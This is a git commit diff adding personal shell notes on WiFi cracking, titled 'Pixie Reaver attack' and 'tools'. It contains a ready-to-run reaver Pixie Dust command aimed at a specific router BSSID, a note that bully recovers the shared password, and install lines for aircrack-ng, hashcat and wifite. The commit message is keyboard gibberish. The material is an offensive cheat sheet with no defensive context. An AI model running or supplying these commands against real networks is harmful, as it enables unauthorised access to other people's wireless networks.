17dd3ab783cc02847e61c046e450ece55ccca1ac
Robert <robby2992@gmail.com>
2024-01-18 10:00:28 -0500

    hytgrfeds

---
+++ CANO/12. Pixie Reaver.sh
@@ -0,0 +1,5 @@
+# Pixie Reaver attack
+exploits a math problem in WPS
+# bully
+bully does the fake auth, then when password is shared with you it prints it to the terminal
+sudo reaver -i wlx00c0cab46234 -b 74:DA:88:59:96:A9 -c 10 -K -S -vvv | tee output.txt
--- CANO/8. xx.tools.sh
+++ CANO/8. xx.tools.sh
@@ -7,3 +7,11 @@ scrapy startproject wordlist_scrappe
 sudo apt install aircrack-ng
 #hashcat
 get lists from country agency
+
+## rsync
+rsync --daemon
+ps x | grep rsync
+#reaver
+sudo reaver -i wlx00c0cab46234 -b 74:DA:88:59:96:A9 -c 10 -K -S -vvv | tee output.txt
+#wifite
+sudo apt install wifite
